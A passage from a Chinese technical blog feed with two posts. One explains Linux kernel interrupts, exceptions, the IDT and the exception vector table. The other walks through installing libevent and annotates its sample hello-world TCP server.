title="异常"></a>异常</h5><ul><li>处理器探测异常：当CPU执行指令时探测到的一个反常条件所产生的异常。可以进一步分为三组。这取决于CPU控制单元产生异常时保存在内核态堆栈<code>eip</code>寄存器中的值<ul><li>故障(fault)：通常可以纠正，一旦纠正，程序就可以在不失连贯性的情况下重新开始。保存在<code>eip</code>中的值是引起故障的指令地址，因此，当异常处理程序终止时，那条指令会被重新执行。</li><li>陷阱(trap)：在陷阱指令执行后立即报告，内核把控制权返回给程序后就可以继续执行它的执行而不失连贯性，保存在<code>eip</code>中的值是一个随后要执行的指令地址。只有当没有必要重新执行已终止的指令时，才触发陷阱，<strong>陷阱的主要用途是为了调试程序</strong>。在这种情况下，中断信号的作用是通知调试程序一条特殊指令已被执行(例如到了一个程序的断点)。一旦用户检查到调试程序所提供的数据，他就可能要求被调试程序从下一条指令重新开始执行。</li><li>异常中止(abort)：发生一个严重的错误，控制单元出了问题，不能在<code>eip</code>寄存器中保存引起异常的指令所在的确切位置。异常中止用于报告严重的错误，如硬件故障或系统表中无效的值或不一致的值。由控制单元发生的这个中断信号是紧急信号，用来把控制权切换到相应的异常中止处理程序，这个异常中止处理程序除了强制受影响的进程终止外，没有别的选择。</li></ul></li><li>编程异常：在编程者发出请求时发生。是由<code>int</code>或<code>int3</code>指令触发的，当<code>into</code>(检查溢出)和<code>bound</code>(检查越界)指令检查的条件不为真时，也引起编程异常。控制单元把编程异常作为陷阱来处理，编程异常通常也叫做<strong>软中断</strong>。这样的异常有两种常用的用途：执行系统调用及给调试程序通报一个特定的事件。</li></ul><p>每个中断和异常是由0~255之间的一个数来标识，因为一些未知的原因，Intel把这个8位的无符号整数叫做一个向量(vector)。非屏蔽中断的向量和异常的向量是固定的。而可屏蔽中断的向量可以通过对中断控制器的编程来改变。</p><h4 id="IRQ和中断"><a href="#IRQ和中断" class="headerlink" title="IRQ和中断"></a>IRQ和中断</h4><p>每个能够发出中断请求的硬件设备控制器都有一条名为IRQ(Interrupt ReQuest)的输出线，所有现有的IRQ线都与一个名为可编程中断控制器(Programmable Interrupt Controller,PIC)的硬件电路的输入引脚相连，可编程中断控制器执行下列动作</p><ul><li>监视IRQ线，检查产生的信号(raised signal)。如果有条或两条以上的IRQ线上产生信号，就选择引脚编号较小的IRQ线，</li><li>如果一个引发信号出现在IRQ线上<ul><li>把接收到的引发信号转换成对应的向量</li><li>把这个向量存放在中断控制器的一个I/O端口，从而允许CPU通过数据总线读此向量</li><li>把引发信号发送到处理器的INTR引脚，即产生一个中断</li><li>等待，直到CPU通过把这个中断信号写进可编程中断控制器的一个I/O端口来确认它，当这种情况发生时，清INTR线。</li></ul></li><li>返回到监视IRQ线操作</li></ul><p>IRQ线是从0开始顺序编号的，因此，第一条IRQ线通常表示为IRQ0，与IRQn关联的Intel的缺省向量是n+32。如前所述，通过向中断控制器端口发布合适的指令，就可以修改IRQ和向量之间的映射。</p><p>可以有选择地禁止每条IRQ线。因此，可以对PIC编程从而禁止IRQ，也就是说，可以告诉PIC停止对给定的IRQ线发布中断，或者激活它们。禁止的中断是丢失不了的，它们一旦被激活，PIC就又把它们发送到CPU。这个特点被大多数中断处理程序使用，因为这允许中断处理程序逐次地处理同一类型的IRQ。</p><h4 id="高级可编程中断控制器"><a href="#高级可编程中断控制器" class="headerlink" title="高级可编程中断控制器"></a>高级可编程中断控制器</h4><p>如果系统只有一个单独的CPU，那么主PIC的输出线可以直截了当的连接到CPU的INTR引脚。然而，如果系统中包含两个或多个CPU，那么这种方式不再有效，因而需要更复杂的PIC。</p><p>Intel从<code>Pentiun III</code>开始引入了一种名为I/O高级可编程控制器(APIC)的新组件。此外，<code>80x86</code>微处理器当前所有的CPU都含有一个本地<code>APIC</code>。每个本地<code>APIC</code>都有32位的寄存器、一个内部时钟、一个本地定时设备及为本地<code>APIC</code>中断保留的两条额外的IRQ线<code>LINR0</code>和<code>LINT1</code>。所有本地<code>APIC</code>都连接到一个外部<code>I/O APIC</code>，形成一个多<code>APIC</code>的系统。</p><h4 id="异常-1"><a href="#异常-1" class="headerlink" title="异常"></a>异常</h4><p><code>80x86</code>微处理器发布了大约20种不同的异常。内核必须为每种异常提供一个专门的异常处理程序。对于某些异常，CPU控制单元在开始执行异常处理程序前会产生一个硬件出错码，并且压入内核态堆栈。</p><p>在<code>80x86</code>处理器中可以找到的异常的向量、名字、类型及其描述如下</p><ul><li>0 “Divide error”（故障）：当一个程序试图执行整数被0除操作时产生</li><li>1 “Debug”（陷阱或故障）：设置<code>eflags</code>的TF标志时或一条指令或操作数的地址落在一个活动debug寄存器的范围之内时</li><li>2 未用 ：为非屏蔽中断保留（利用NMI引脚的那些中断）</li><li>3 “Breakpoint” （陷阱）：由<code>int3</code>(断点)指令引起</li><li>4 “Overflow”（陷阱）：当<code>eflags</code>的OF标志被设置时，<code>into</code>(检查溢出)指令被执行</li><li>5 “Bounds check”（故障）：对于有效抵制范围之外的操作数，bound(检查地址边界)指令被执行</li><li>6 “Invalid opcode”（故障）：CPU执行单元检测到一个无效的操作码</li><li>7 “Device not available”（故障）：随着<code>cr0</code>的TS标志被设置，ESCAPE、MMX或XMM指令被执行</li><li>8 “Double fault”（异常中止）：正常情况下，当CPU试图为前一个异常调用处理程序时，同时又检测到一个异常，两个异常能被串行地处理。然而，在少数情况下，处理器不能串行地处理它们，因而产生这种异常。</li><li>9 “Coprocessor segment overrun”（异常中止）：因外部的数学斜处理器引起的问题</li><li>10 “Invalid TSS”（故障）：CPU试图让一个上下文切换到有无效的TSS的进程</li><li>11 “Segment not present”（故障）：引用一个不存在的内存段</li><li>12 “Stack segment fault”（故障）：试图超过栈段界限的指令，或者由ss标识的段不在内存</li><li>13 “General protection”（故障）：违反了<code>80x86</code>保护模式下的保护规则之一</li><li>14 “Page fault”（故障）：寻址的页不在内存，相应的页表项为空，或者违反了一种分页保护机制</li><li>15 由Intel保留</li><li>16 “Floating point error”（故障）：集成到CPU芯片中的浮点单元用信号通知一个错误情形，如数字溢出，或被0除</li><li>17 “Alignment check”（故障）：操作数的地址没有被正确的对齐</li><li>18 “Machine check”（异常中止）：机器检查机制检测到一个CPU错误或总线错误</li><li>19 “SIMD floating point exception”（故障）：集成到CPU芯片中的SSE或SSE2单元对浮点操作用信号通知一个错误情形</li><li>20～31这些值由Intel留作将来开发</li></ul><div class="table-container"><table><thead><tr><th>编号</th><th>异常</th><th>异常处理程序</th><th>信号</th></tr></thead><tbody><tr><td>0</td><td>Divide error</td><td>divide_error()</td><td>SIGFPE</td></tr><tr><td>1</td><td>Debug</td><td>debug()</td><td>SIGTRAP</td></tr><tr><td>2</td><td>NMI</td><td>nmi()</td><td>None</td></tr><tr><td>3</td><td>Breakpoint</td><td>int3()</td><td>SIGTRAP</td></tr><tr><td>4</td><td>Overflow</td><td>overflow()</td><td>SIGSEGV</td></tr><tr><td>5</td><td>Bounds check</td><td>bounds()</td><td>SIGSEGV</td></tr><tr><td>6</td><td>Invalid opcode</td><td>invalid_op()</td><td>SIGILL</td></tr><tr><td>7</td><td>Device not available</td><td>device_not_available()</td><td>None</td></tr><tr><td>8</td><td>Double fault</td><td>doublefault_fn()</td><td>None</td></tr><tr><td>9</td><td>Coprocessor segment overrun</td><td>coprocessor_segment_overrun()</td><td>SIGFPE</td></tr><tr><td>10</td><td>Invalid TSS</td><td>invalid_tss()</td><td>SIGSEGV</td></tr><tr><td>11</td><td>Segment not present</td><td>segment_not_present()</td><td>SIGBUS</td></tr><tr><td>12</td><td>Stack exception</td><td>stack_segment()</td><td>SIGBUS</td></tr><tr><td>13</td><td>General protection</td><td>general_protection()</td><td>SIGSEGV</td></tr><tr><td>14</td><td>Page fault</td><td>page_fault()</td><td>SIGSEGV</td></tr><tr><td>15</td><td>Intel reserved</td><td>None</td><td>None</td></tr><tr><td>16</td><td>Floating point error</td><td>coprocessor_error()</td><td>SIGFPE</td></tr><tr><td>17</td><td>Alignment check</td><td>alignment_check()</td><td>SIGSEGV</td></tr><tr><td>18</td><td>Machine check</td><td>machine_check()</td><td>None</td></tr><tr><td>19</td><td>SIMD floating point</td><td>simd_coprocessor_error()</td><td>SIGFPE</td></tr></tbody></table></div><h4 id="中断描述符表"><a href="#中断描述符表" class="headerlink" title="中断描述符表"></a>中断描述符表</h4><p>中断描述符表(Interrupt Descriptor Table,IDT)是一个系统表，它与每一个中断或异常向量相联系，每一个向量在表中有相应的中断或异常处理程序的入口地址。内核在允许中断发生前，必须适当的初始化IDT</p><p>IDT包含三种类型的描述符，下图显示了每种描述符中的64位的含义，值得注意的是，在40～43位的Type字段的值表示描述符的类型。</p><p><img src="/2021/11/23/深入理解linux内核之中断和异常/1.png" alt="1"></p><ul><li>任务门(task gate)：当中断信号发生时，必须取代当前进程的那个进程的TSS选择符放在任务门中</li><li>中断门(interrupt gate)：包含段选择符和中断或异常处理程序的段内偏移量。当控制权转移到一个适当的段时，处理器清IF标志，从而关闭将来会发生的可屏蔽中断</li><li>陷阱门(Trap gate)：与中断门相似，只是控制权传递到一个适当的段时处理器不修改IF标志</li></ul><h4 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h4><p>CPU产生的大部分异常都由Linux解释为出错条件，当其中一个异常发生时，内核就向引起异常的进程发送一个信号向它通知一个反常条件，例如，如果进程执行了一个被0除的操作，CPU就产生一个”Divide error”异常，并由相应的异常处理程序向当前进程发送一个SIGFPE信号，这个进程将采取若干必要的步骤来恢复或者中止运行。</p><p>异常处理程序有一个标准的结构，由以下三部分组成</p><ul><li>在内核堆栈中保存大多数寄存器的内容</li><li>用高级的C函数处理异常</li><li>通过<code>ret_from_exception()</code>函数从异常程序退出</li></ul><p>为了利用异常，必须对IDT进行适当的初始化，使得每个被确认的异常都有一个异常处理程序。<code>trap_init()</code>函数的工作时将一些最终值(即处理异常的函数)插入到IDT的非屏蔽中断及异常表项中，这是由函数<code>set_trap_gate()</code>、<code>set_intr_gate()</code>、<code>set_system_intr_gate()</code>和<code>set_task_gate()</code>来完成的</p><h4 id="中断处理"><a href="#中断处理" class="headerlink" title="中断处理"></a>中断处理</h4><p>中断处理依赖于中断类型，目前主要有三种主要的中断类型。</p><ul><li>I/O中断：某些I/O设备需要关注，相应的中断处理程序必须查询设备以确定适当的操作过程</li><li>时钟中断：某些时钟产生一个中断，这种中断告诉内核一个固定的时间间隔已经过去</li><li>处理器中断：多处理器系统中一个CPU对另一个CPU发出一个中断</li></ul><h4 id="I-O中断处理"><a href="#I-O中断处理" class="headerlink" title="I/O中断处理"></a>I/O中断处理</h4><p>中断处理程序的灵活性是以两种不同的方式实现的</p><ul><li>IRQ共享：中断处理程序执行多个中断服务例程(interrupt service routine，ISR)，每个ISR是一个与单独设备(共享IRQ线)相关的函数。因为不可能预先知道哪个特定的设备产生IRQ，因此，每个ISR都被执行，以验证它的设备是否需要关注，如果是，当设备产生中断时，就执行需要执行的所有操作。</li><li>IRQ动态分配：一条IRQ线在可能的最后时刻才与一个设备驱动程序相关联，例如，软盘设备的IRQ线只有在用户访问软盘设备时才被分配。这样，即使几个硬件设备并不共享IRQ线，同一个IRQ向量也可以由这几个设备在不同时刻使用。</li></ul><p>当一个中断发生时，并不是所有的操作都具有相同的急迫性。事实上，把所有的操作都放进中断处理程序本身并不合适，需要时间长的、非重要的操作应该推后，因为当一个中断处理程序正在运行时，相应的IRQ线上发出的信号就被暂时忽略。更重要的是，中断处理程序是代表进程执行的，它所代表的进程必须总处于<code>TASK_RUNNING</code>状态，否则，就可能出现系统僵死情形。因此，中断处理程序不能执行任何阻塞过程。如磁盘I/O操作，因此Linux把紧随中断要执行的操作分为三类</p><ul><li>紧急的（Critical）：这样的操作诸如：对PIC应答中断，对PIC或设备控制器重编程，或者修改由设备和处理器同时访问的数据结构，这些都能被很快地执行，而之所以说它们是紧急的是因为他们必须被尽快的执行。紧急操作要在一个中断处理程序内立即执行，而且是在禁止可屏蔽中断的情况下。</li><li>非紧急的（Noncritical）：这样的操作诸如修改那些只有处理器才会访问的数据结构，这些操作也要很快地完成，因此，它们由中断处理程序立即执行，但必须是在开中断的情况下。</li><li>非紧急可延迟的（Noncritical deferrable）：这样的操作例如把缓冲区的内容拷贝到某个进程的地址空间。这些操作可能被延迟较长的时间间隔而不影响内核操作。</li></ul><p>不管引起中断的电路种类如何，所有的I/O中断处理程序都执行四个相同的基本操作</p><ul><li>在内核态堆栈中保存IRQ的值和寄存器的内容</li><li>为正在给IRQ线服务的PIC发送一个应答，这将允许PIC进一步发出中断</li><li>执行共享这个IRQ的所有设备的中断服务例程(ISR)</li><li>跳到<code>ret_from_intr()</code>的地址后终止</li></ul><p>Linux中的中断向量</p><div class="table-container"><table><thead><tr><th>向量范围</th><th>用途</th></tr></thead><tbody><tr><td>0～19(0x0~0x13)</td><td>非屏蔽中断和异常</td></tr><tr><td>20~31(0x14~0x1f)</td><td>Intel保留</td></tr><tr><td>32~127(0x20~0x7f)</td><td>外部中断(IRQ)</td></tr><tr><td>128(0x80)</td><td>用于系统调用的可编程异常</td></tr><tr><td>129~238(0x81~0xee)</td><td>外部中断(IRQ)</td></tr><tr><td>239(0xef)</td><td>本地APIC时钟中断</td></tr><tr><td>240(0xf0)</td><td>本地APIC高温中断</td></tr><tr><td>241~250(0xf0~0xfa)</td><td>由Linux留作将来使用</td></tr><tr><td>251~253(0xfb~0xff)</td><td>处理器间中断</td></tr><tr><td>254(0xfe)</td><td>本地APIC错误中断</td></tr><tr><td>255(0xff)</td><td>本地APIC伪中断</td></tr></tbody></table></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h4&gt;&lt;p&gt;中断通常被定义为一个事件，该事件改变处理器执行的指令顺序。这样的事件与CPU芯片内外部硬件电路产生的电信号相对应。&lt;/p&gt;
&lt;p&gt;中断通常分
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>浅学libevent</title>
    <link href="elssm.github.io/2021/11/19/%E6%B5%85%E5%AD%A6libevent/"/>
    <id>elssm.github.io/2021/11/19/浅学libevent/</id>
    <published>2021-11-19T06:17:46.000Z</published>
    <updated>2021-12-13T09:52:46.659Z</updated>
    
    <content type="html"><![CDATA[<h4 id="libevent简介"><a href="#libevent简介" class="headerlink" title="libevent简介"></a>libevent简介</h4><p><code>libevent</code>是一个用C语言编写的轻量级的开源高性能事件通知库，支持多种I/O多路复用技术，支持定时器和信号等事件，而且是跨平台的。</p><h4 id="libevent特点"><a href="#libevent特点" class="headerlink" title="libevent特点"></a>libevent特点</h4><ul><li>事件驱动，高性能</li><li>轻量级，专注于网络</li><li>跨平台，支持<code>Windows</code>、<code>Linux</code>、<code>MacOs</code>等</li><li><p>支持多种I/O多路复用技术，<code>epoll</code>、<code>poll</code>、<code>dev/poll</code>、<code>select</code>和<code>kqueue</code>等</p></li><li><p>支持I/O，定时器和信号等事件</p></li></ul><h4 id="libevent下载及安装"><a href="#libevent下载及安装" class="headerlink" title="libevent下载及安装"></a>libevent下载及安装</h4><p>下载地址：<a href="https://libevent.org/" target="_blank" rel="noopener">https://libevent.org/</a></p><p>这里我下载的是<code>libevent-2.1.8-stable.tar.gz</code>，下载之后解压。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf libevent-2.1.8-stable.tar.gz</span><br></pre></td></tr></table></figure><p>接下来进行源码包安装，这一步的目的是检查安装环境，生成makefile</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br></pre></td></tr></table></figure><p>之后执行<code>make</code>命令生成<code>.o</code>可执行文件，最后执行<code>sudo make install</code>将必要资源放置系统指定目录</p><h4 id="验证libevent安装"><a href="#验证libevent安装" class="headerlink" title="验证libevent安装"></a>验证libevent安装</h4><p>进入<code>libevent-2.1.8-stable</code>下的<code>sample</code>目录，gcc编译<code>hello-world.c</code>文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello-world.c -o hello</span><br></pre></td></tr></table></figure><p>这个时候会出现报错如下，显示未定义引用</p><p><img src="/2021/11/19/浅学libevent/1.png" alt="1"></p><p>出现上述报错是因为我们没有指定库名，因此需要加<code>-l</code>选项</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc hello-world.c -o hello -l event</span><br></pre></td></tr></table></figure><p><code>hello</code>文件是一个简单的服务器程序，端口是<code>9995</code>，我们尝试运行<code>hello</code>，它会等待客户端的连接。并向客户端发送<code>Hello,World</code>字符串，如下所示，证明<code>libevent</code>库安装成功。</p><p><img src="/2021/11/19/浅学libevent/2.png" alt="2"></p><p><code>libevent</code>库的安装位置在<code>/usr/local/lib</code>路径下</p><p><img src="/2021/11/19/浅学libevent/3.png" alt="3"></p><h4 id="Hello-world分析"><a href="#Hello-world分析" class="headerlink" title="Hello-world分析"></a>Hello-world分析</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This example program provides a trivial server program that listens for TCP</span></span><br><span class="line"><span class="comment">  connections on port 9995.  When they arrive, it writes a short message to</span></span><br><span class="line"><span class="comment">  each client connection, and closes each connection once it is flushed.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Where possible, it exits cleanly in response to a SIGINT (ctrl-c).</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> _WIN32</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">ifdef</span> _XOPEN_SOURCE_EXTENDED</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/bufferevent.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/buffer.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/listener.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/util.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;event2/event.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> MESSAGE[] = <span class="string">"Hello, World!\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//指定端口</span></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">int</span> PORT = <span class="number">9995</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//声明静态函数</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">listener_cb</span><span class="params">(struct evconnlistener *, <span class="keyword">evutil_socket_t</span>,</span></span></span><br><span class="line"><span class="function"><span class="params">    struct sockaddr *, <span class="keyword">int</span> socklen, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">conn_writecb</span><span class="params">(struct bufferevent *, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">conn_eventcb</span><span class="params">(struct bufferevent *, short, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">signal_cb</span><span class="params">(<span class="keyword">evutil_socket_t</span>, short, <span class="keyword">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span></span><br><span class="line">main(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span>;</span> <span class="comment">//libevent基础声明。相当于一个底座</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evconnlistener</span> *<span class="title">listener</span>;</span> <span class="comment">//监听，用于建立连接</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event</span> *<span class="title">signal_event</span>;</span> <span class="comment">//信号事件</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sin</span>;</span> <span class="comment">//地址结构</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> _WIN32</span></span><br><span class="line">WSADATA wsa_data;</span><br><span class="line">WSAStartup(<span class="number">0x0201</span>, &amp;wsa_data);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">base = event_base_new(); <span class="comment">//创建底座</span></span><br><span class="line"><span class="keyword">if</span> (!base) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Could not initialize libevent!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;<span class="built_in">sin</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="built_in">sin</span>)); <span class="comment">//地址结构清零</span></span><br><span class="line"><span class="built_in">sin</span>.sin_family = AF_INET;</span><br><span class="line"><span class="built_in">sin</span>.sin_port = htons(PORT);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于socket、bind、listen、accept的融合</span></span><br><span class="line">listener = evconnlistener_new_bind(base, listener_cb, (<span class="keyword">void</span> *)base,</span><br><span class="line">    LEV_OPT_REUSEABLE|LEV_OPT_CLOSE_ON_FREE, <span class="number">-1</span>,</span><br><span class="line">    (struct sockaddr*)&amp;<span class="built_in">sin</span>,</span><br><span class="line">    <span class="keyword">sizeof</span>(<span class="built_in">sin</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!listener) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Could not create a listener!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//创建信号事件</span></span><br><span class="line">signal_event = evsignal_new(base, SIGINT, signal_cb, (<span class="keyword">void</span> *)base);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!signal_event || event_add(signal_event, <span class="literal">NULL</span>)&lt;<span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Could not create/add a signal event!\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于while循环+select/poll/epoll</span></span><br><span class="line">event_base_dispatch(base);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//释放相关事件</span></span><br><span class="line">evconnlistener_free(listener); </span><br><span class="line">event_free(signal_event);</span><br><span class="line">event_base_free(base);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"done\n"</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">listener_cb(struct evconnlistener *listener, <span class="keyword">evutil_socket_t</span> fd,</span><br><span class="line">    struct sockaddr *sa, <span class="keyword">int</span> socklen, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">event_base</span> *<span class="title">base</span> = <span class="title">user_data</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bufferevent</span> *<span class="title">bev</span>;</span></span><br><span class="line"></span><br><span class="line">bev = bufferevent_socket_new(base, fd, BEV_OPT_CLOSE_ON_FREE);</span><br><span class="line"><span class="keyword">if</span> (!bev) &#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Error constructing bufferevent!"</span>);</span><br><span class="line">event_base_loopbreak(base);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">bufferevent_setcb(bev, <span class="literal">NULL</span>, conn_writecb, conn_eventcb, <span class="literal">NULL</span>);</span><br><span class="line">bufferevent_enable(bev, EV_WRITE);</span><br><span class="line">bufferevent_disable(bev, EV_READ);</span><br><span class="line"></span><br><span class="line">bufferevent_write(bev, MESSAGE, <span class="built_in">strlen</span>(MESSAGE));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">conn_writecb(struct bufferevent *bev, <span class="keyword">void</span> *user_data)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">evbuffer</span> *<span class="title">output</span> = <span class="title">bufferevent_get_output</span>(<span class="title">bev</span>);</span></span><br><span class="line"><span class="keyword">if</span> (evbuffer_get_length(output) == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"flushed answer\n"</span>);</span><br><span class="line">bufferevent_free(bev);</span><br><span 